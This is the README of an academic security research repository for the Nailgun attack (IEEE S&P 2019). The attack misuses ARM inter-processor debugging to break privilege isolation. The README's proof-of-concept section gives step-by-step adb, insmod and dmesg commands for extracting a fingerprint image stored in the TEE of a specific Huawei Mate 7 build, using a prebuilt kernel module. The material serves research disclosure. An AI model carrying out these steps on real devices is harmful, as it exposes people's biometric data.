
# Nailgun: Break the privilege isolation in ARM devices

## Overview
Processors nowadays are consistently equipped with debugging features to facilitate the program debugging and analysis. Specifically, the ARM debugging architecture involves a series of CoreSight components and debug registers to aid the system debugging, but the security of the debugging features is under-examined since it normally requires physical access to use these features in the traditional debugging model.

The idea of Nailgun Attack is to misuse the debugging architecture with the inter-processor debugging model. In the inter-processor debugging model, a processor (debug host) is able to pause and debug another processor (debug target) on the same chip even when the debug target owns a higher privilege. With Nailgun, we are able to obtain sensitive information and achieve arbitrary payload execution in a high-privilege mode.

For more details, please check our website http://compass.cs.wayne.edu/nailgun

## Proof of Concept
We will make two PoCs available on Github:

### PoC1: Reading  _SCR_EL3_  register with a kernel module.
  
### PoC2:  Extracting the fingerprint image.
In this PoC, we use a kernel module running in non-secure EL1 to extract the fingerprint image
stored in TEE on Huawei Mate 7. The fold ```PoC/Fingerprint_Extraction``` contains the source code for the kernel module that extracts fingerprint data from TEE, a prebuild binary of the kernel module, and a python script to convert the extracted image data to a PNG file.
**Note that the source code and prebuild binary works on Huawei Mate 7 (MT7-L09) Build MT7-L09V100R001C00B121SP05**

#### Prepare
- Make sure you have scanned a fingerprint with the fingerprint sensor.
- Enable USB debugging on your phone and connect it to your PC. (**Nailgun attack doesn't require physical access to the phone, the connection is only used for transferring the binary to the phone and moving the output log to the PC.**)
#### Run

Firstly, push the prebuild binary into the phone
```
adb push nailgun.ko /sdcard/
```
Next, in the _adb shell_ console of the phone, install the kernel module
```
adb shell
shell@hwmt7:/ $ su
root@hwmt7:/ # insmod /sdcard/nailgun.ko
```
Check the kernel log with _dmesg_ command
```
root@hwmt7:/ # dmesg
```
If you can find the fingerprint data similar to this
```
<6>[   51.284149] [0.1, swapper/1] --------------------
<6>[   51.284210] [0.1, swapper/1] 2ef5efac: 412f0100 87796552 e8e2dfd4 eff0eeea
<6>[   51.284240] [0.1, swapper/1] 2ef5efbc: f3f3f3f3 f3f1f8f6 f3f3f2f1 eff4f4f8
<6>[   51.284301] [0.1, swapper/1] 2ef5efcc: f1f0f2f0 f1f0eff3 f1f1efee efeff0ee
<6>[   51.284332] [0.1, swapper/1] 2ef5efdc: e7ecefeb e8e9e8ed e6e4e3e6 e1e5e5e6
<6>[   51.284393] [0.1, swapper/1] 2ef5efec: e9e5e6e4 dfe3e3e6 e4e5e5e2 e0e3e3e3
<6>[   51.284423] [0.1, swapper/1] 2ef5effc: dee1e3e2 e8e6e1df eae8e6e7 eaeceeeb
<6>[   51.284484] [0.1, swapper/1] 2ef5f00c: e5e3e5e5 edebe6e7 edefeff1 f1eeeff0
<6>[   51.284515] [0.1, swapper/1] 2ef5f01c: e7eaebea e9e9e8e5 e6e7eaeb e4e5e4e2
<6>[   51.284576] [0.1, swapper/1] 2ef5f02c: e7e9e8e8 e5e6e7e6 e7eae7ea e2e4e4e5
```
then the PoC works.
Next, dump the kernel log to file, and extract the file from the phone to your PC
```
root@hwmt7:/ # dmesg > /sdcard/nailgun.log
root@hwmt7:/ # exit
shell@hwmt7:/ $ exit
adb pull /sdcard/nailgun.log .
```
Finally, use the python script to convert the fingerprint data to a PNG file
```
python log2image.py nailgun.log
```
You will find a file named _fingerprint.png_ with the extracted fingerprint image.

## Publication
```
@InProceedings{nailgun19,
	Title = {Understanding the security of ARM debugging features},
	Author = {Zhenyu Ning and Fengwei Zhang},
	Booktitle = {Proceedings of the 40th IEEE Symposium on Security and Privacy (S&P'19)},
	Year = {2019}
}
```

## Contact
Zhenyu Ning  
zhenyu.ning _at_ wayne.edu  
Compass Lab, Wayne State University (http://compass.cs.wayne.edu)
